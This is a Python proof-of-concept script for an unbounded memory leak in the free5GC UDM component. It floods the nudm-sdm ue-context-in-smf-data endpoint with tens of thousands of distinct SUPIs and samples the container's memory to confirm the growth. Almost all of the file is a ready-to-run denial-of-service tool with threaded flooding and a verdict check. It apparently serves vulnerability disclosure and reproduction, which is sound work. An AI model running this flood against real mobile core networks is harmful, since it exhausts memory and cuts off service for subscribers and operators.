#!/usr/bin/env python3
"""
PoC - free5GC UDM UdmUePool unbounded-growth memory leak (v4.3.0).

Floods GET /nudm-sdm/v2/{supi}/ue-context-in-smf-data with a distinct SUPI per
request (--mode attack): the SDM handler stores a UdmUeContext in the
process-global UdmUePool sync.Map before any token/UDR gate, and the whole NF
has no eviction path, so UDM RSS grows ~1.5 kB per request and never returns
to baseline. --mode control reuses one SUPI (Load-hits only, no new store) and
must stay flat. A fixed-SUPI --warmup absorbs transient Go heap churn before
the RSS baseline; the verdict combines net growth, the second-half slope and
the HTTP status counts. RSS is sampled from the container's VmRSS (docker
exec) every --sample-every requests.

Usage:
  python3 poc.py --target-ip 10.100.200.12 --port 8000 --ctr udm \
      --count 50000 --mode attack    # distinct-SUPI flood -> RSS climbs
  python3 poc.py --target-ip 10.100.200.12 --port 8000 --ctr udm \
      --count 50000 --mode control   # one reused SUPI -> flat

Prerequisites: python3 + requests; the UDM SBI must be reachable at
--target-ip:--port and --ctr must name the UDM container for RSS sampling.
Optional: --csv writes the RSS series, --summary writes a JSON verdict.
"""
import argparse, json, subprocess, sys, time
from concurrent.futures import ThreadPoolExecutor
import requests

PREFIX = "imsi-20893"   # mcc 208 / mnc 93 = the UDR's registered PLMN (discovery succeeds)

def rss_kib(ctr):
    try:
        out = subprocess.check_output(["docker", "exec", ctr, "cat", "/proc/1/status"], text=True)
        for ln in out.splitlines():
            if ln.startswith("VmRSS:"):
                return int(ln.split()[1])
    except Exception:
        return -1
    return -1

def url(base, supi):
    return f"{base}/nudm-sdm/v2/{supi}/ue-context-in-smf-data"

def one(sess, base, supi):
    try:
        r = sess.get(url(base, supi), timeout=10)
        return r.status_code
    except Exception:
        return 0

def run_batch(base, supis, threads):
    codes = {}
    with ThreadPoolExecutor(max_workers=threads) as ex:
        ss = [requests.Session() for _ in range(threads)]
        futs = [ex.submit(one, ss[i % threads], base, s) for i, s in enumerate(supis)]
        for f in futs:
            c = f.result()
            codes[c] = codes.get(c, 0) + 1
    return codes

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target-ip", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=28082)
    ap.add_argument("--ctr", default="f5u-udm")
    ap.add_argument("--count", type=int, default=50000)
    ap.add_argument("--mode", choices=["attack", "control"], default="attack")
    ap.add_argument("--warmup", type=int, default=3000)
    ap.add_argument("--sample-every", type=int, default=2500)
    ap.add_argument("--threads", type=int, default=32)
    ap.add_argument("--id-base", type=int, default=1000000, help="start of distinct-supi index (avoid collision across runs)")
    ap.add_argument("--csv", default="", help="write RSS series to this CSV")
    ap.add_argument("--summary", default="", help="write JSON verdict to this file")
    args = ap.parse_args()

    base = f"http://{args.target_ip}:{args.port}"
    print(f"[*] target={base} mode={args.mode} count={args.count} ctr={args.ctr}")

    # --- fixed-SUPI warmup: absorb transient Go-heap churn WITHOUT leaking distinct entries ---
    wsupi = f"{PREFIX}9999999999"
    wcodes = run_batch(base, [wsupi] * args.warmup, args.threads)
    time.sleep(0.5)
    base_rss = rss_kib(args.ctr)
    print(f"[*] warmup done codes={wcodes} baseline RSS={base_rss} kB")

    series = []            # (idx, rss_kb)
    all_codes = {}
    total = 0
    step = args.sample_every
    while total < args.count:
        n = min(step, args.count - total)
        if args.mode == "attack":
            supis = [f"{PREFIX}{args.id_base + total + i:010d}" for i in range(n)]   # all distinct
        else:
            supis = [f"{PREFIX}0000000001"] * n                                       # one reused
        codes = run_batch(base, supis, args.threads)
        for k, v in codes.items():
            all_codes[k] = all_codes.get(k, 0) + v
        total += n
        r = rss_kib(args.ctr)
        series.append((total, r))
        print(f"    idx={total:7d} RSS={r} kB  (+{r - base_rss})")

    final_rss = series[-1][1]
    net = final_rss - base_rss
    half = len(series) // 2
    second_half_growth = series[-1][1] - series[half][1] if len(series) > 2 else 0
    per_req = (net * 1024) // max(args.count, 1)
    reproduced = (net > 2000) and (second_half_growth > 500) and (args.mode == "attack")
    verdict = "REPRODUCED" if reproduced else ("FLAT_AS_EXPECTED" if args.mode == "control" else "NOT_REPRODUCED")
    print(f"\n[*] RESULT mode={args.mode} net={net} kB per_req={per_req}B "
          f"2nd-half=+{second_half_growth} kB codes={all_codes} => {verdict}")

    if args.csv:
        with open(args.csv, "w") as f:
            f.write("idx,rss_kb,net_kb\n")
            f.write(f"0,{base_rss},0\n")
            for idx, r in series:
                f.write(f"{idx},{r},{r - base_rss}\n")
    if args.summary:
        json.dump({
            "mode": args.mode, "count": args.count, "baseline_rss_kb": base_rss,
            "final_rss_kb": final_rss, "net_growth_kb": net, "per_req_bytes": per_req,
            "second_half_growth_kb": second_half_growth, "status_counts": all_codes,
            "warmup_codes": wcodes, "verdict": verdict,
        }, open(args.summary, "w"), indent=2)
    return 0

if __name__ == "__main__":
    sys.exit(main())
